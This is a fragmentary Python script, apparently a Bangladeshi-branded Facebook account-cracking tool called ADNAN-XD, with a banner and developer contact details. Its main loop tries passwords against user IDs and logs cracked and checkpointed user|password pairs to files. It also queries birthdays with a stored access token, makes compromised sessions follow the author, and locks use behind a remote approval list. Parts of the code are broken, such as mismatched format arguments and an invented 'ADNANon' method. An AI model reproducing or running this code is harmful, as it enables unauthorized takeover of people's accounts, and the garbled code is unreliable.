...
import requests, os, re, bs4,platform, sys, ADNANon, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
...
\033[1;32m 
      ...
      db      `7MM"""Yb. `7MN.   `7MF'     db      `7MN.   `7MF'  `YMM'   `MP' `7MM"""Yb.   
     ;MM:       MM    `Yb. MMN.    M      ;MM:       MMN.    M      VMb.  ,P     MM    `Yb. 
    ,V^MM.      MM     `Mb M YMb   M     ,V^MM.      M YMb   M       `MM.M'      MM     `Mb 
   ,M  `MM      MM      MM M  `MN. M    ,M  `MM      M  `MN. M         MMb       MM      MM 
   AbmmmqMA     MM     ,MP M   `MM.M    AbmmmqMA     M   `MM.M mmmmm ,M'`Mb.     MM     ,MP 
  A'     VML    MM    ,dP' M     YMM   A'     VML    M     YMM      ,P   `MM.    MM    ,dP' 
.AMA.   .AMMA..JMMmmmdP' .JML.    YM .AMA.   .AMMA..JML.    YM    .MM:.  .:MMa..JMMmmmdP'  
                                                          
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :   ADNAN-XHOWDHURY
     \033[1;91m➣ \033[1;91mFACEBOOK   :   MR ADNAN FACEBOOK MASTER
     \033[1;92m➣ \033[1;92mWHATSAPP   :  01758329292
     \033[1;91m➣ \033[1;91mGITHUB     :     ADNAN-XD
...
a=requests.get("https://github.com/ADNAN601-X/ADNAN-FILE/blob/main/Approv.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    ...
    print(yellow+"\n\t\tContact Admin ")
    os.system('xdg-open https://m.me/j/AbZNImGqOTb-E7YC/')
    exit()
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mADNAN_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mADNAN_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;93mPress enter to back ADNAN Menu ")
	    sarfraz()

def sarfraz():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).ADNANon()
    todz = ''
    IP = ipm['origin']
    print
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;93m[ADNAN-CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [ADNAN-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('ADNAN_OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').ADNANon()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s [ADNAN-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('ADNAN_CP.txt' , 'a').write('%s\n' % wrt)
                        break
